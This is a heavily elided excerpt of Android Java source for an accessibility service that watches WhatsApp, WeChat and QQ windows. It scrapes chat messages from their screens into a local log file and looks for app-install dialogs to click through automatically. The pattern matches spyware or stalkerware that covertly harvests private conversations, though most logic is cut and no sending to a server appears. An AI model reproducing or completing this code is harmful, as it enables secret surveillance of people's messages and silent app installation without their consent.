...
@TargetApi(Build.VERSION_CODES.JELLY_BEAN) public class accessibilityService extends AccessibilityService {
	...
	*/
	...
	@SuppressLint("InlinedApi") public void onAccessibilityEvent(AccessibilityEvent event){
		try{
			/*
		    ...
		    */
		    ...
		    if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED){
		        	...
		        	//if (installAPkFileName != null && installAPkFileName.equals("") == false)  {
		                ...
		                */
		                ...
		                if (findViewByText(installAPkName, false) != null ||findViewByText(installAPkPackName, false) != null) {
							...
							WriteDateFile.writeLogFile("find install apk package name or apk name\r\n");
						}
	    		...
	    		event.getPackageName().equals("com.whatsapp")  ) {
	        	Log.e(TAG,"com.wahtsapp");
		    	AccessibilityNodeInfo rootNode = getRootInActiveWindow();
		    	getWhatsAppMessageFromView(rootNode);
		    }
	        else if ((event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) &&
		    		event.getPackageName().equals("com.tencent.mobileqq")) {
			...
			WriteDateFile.writeLogFile("accessibilityService exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
			return;
		}
	}
    ...
    @SuppressLint("InlinedApi") public void performViewClick(AccessibilityNodeInfo nodeInfo) {
        if (nodeInfo == null) {
            return;
        }
        while (nodeInfo != null) {
	...
	private void getWeChatMsg(AccessibilityNodeInfo rootNode) {
    	...
    	try{
	        ...
	        for (int i = 0; i < llnodes.size(); i++) {
	            ...
	            WriteDateFile.writeDateFile(ForegroundService.LOCAL_PATH_NAME, ForegroundService.CHATTING_FILENAME,jso.toString()+"\r\n", true);
			}
    	}catch(Exception ex){
    		ex.printStackTrace();
    	}
    ...
    private String getWhatsAppMessageFromView(AccessibilityNodeInfo nodeinfo) {
    	...
    	try{
	        if (nodeinfo != null) {
		        ...
		        WriteDateFile.writeDateFile(ForegroundService.LOCAL_PATH_NAME, ForegroundService.CHATTING_FILENAME,json.toString()+"\r\n", true);
			}
    	}catch(Exception ex){
    		ex.printStackTrace();
    	}
    ...
    @SuppressLint("SimpleDateFormat") private long getDateTime(String dt){
    	long time = 0;
    	try {
